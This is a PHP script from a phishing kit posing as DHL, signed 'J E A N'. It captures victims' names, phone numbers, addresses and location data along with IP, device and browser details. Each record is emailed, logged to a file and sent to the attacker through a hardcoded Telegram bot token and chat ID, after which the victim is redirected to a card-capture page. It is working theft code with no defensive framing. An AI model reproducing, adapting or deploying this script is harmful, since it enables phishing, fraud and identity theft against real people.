<?php
include("../../system/os.php");
include "../email.php";
$date = date('m/d/Y h:i:s a', time());
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
if(($_POST['jeanname'] != "") AND ($_POST['jeanadress'] != "") AND ($_POST['jeancountry'] != "") AND ($_POST['jeancity'] != "") AND ($_POST['jeanstate'] != "") AND ($_POST['jeanzip'] != "") AND ($_POST['jeanphone'] != "") )
{
$hostname = gethostbyaddr($ip);
$message .= "+]###############[+] DHL FULLZ [+]###############[+\n";
$message .= "# FULL NAME     : ".$_POST['jeanname']."\n";
$message .= "# PHONE NUMBER  : ".$_POST['jeanphone']."\n";
$message .= "# ADRESS LINE   : ".$_POST['jeanadress']."\n";
$message .= "# COUNTRY       : ".$_POST['jeancountry']."\n";
$message .= "# CITY/TOWN     : ".$_POST['jeancity']."\n";
$message .= "# STATE         : ".$_POST['jeanstate']."\n";
$message .= "# ZIP CODE      : ".$_POST['jeanzip']."\n";
$message .= "# IP INFO       : $ip\n";
$message .= "# TIME/DATE     : $date\n";
$message .= "# DEVICE        : $user_os\n";
$message .= "# BROWSER       : $user_browser\n";
$message .= "+]###############[+] J E A N [+]###############[+\n";
$send = "$to";
$subject = "📦 NEW DHL VICTIM BILLING INFO FROM = $ip";
$headers = "From: J E A N <dhl@jean8.vip>";
mail($send,$subject,$message,$headers);
file_put_contents("../../nj.txt", $message, FILE_APPEND);
function telegram_send($message) {
    $curl = curl_init();
    $api_key  = '1244123994:AAEG5OQvqUXTvyMmc4QWOvgYKIxy1ofq55g';
    $chat_id  = '1128003836';
    $format   = 'HTML';
    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    $result = curl_exec($curl);
    curl_close($curl);
    return true;
}


telegram_send(urlencode($message));
echo "<meta http-equiv='refresh' content='0; url=../../card.php'/>";
}
	else {
     echo "<meta http-equiv='refresh' content='0; ../../card.php' />";
}

?>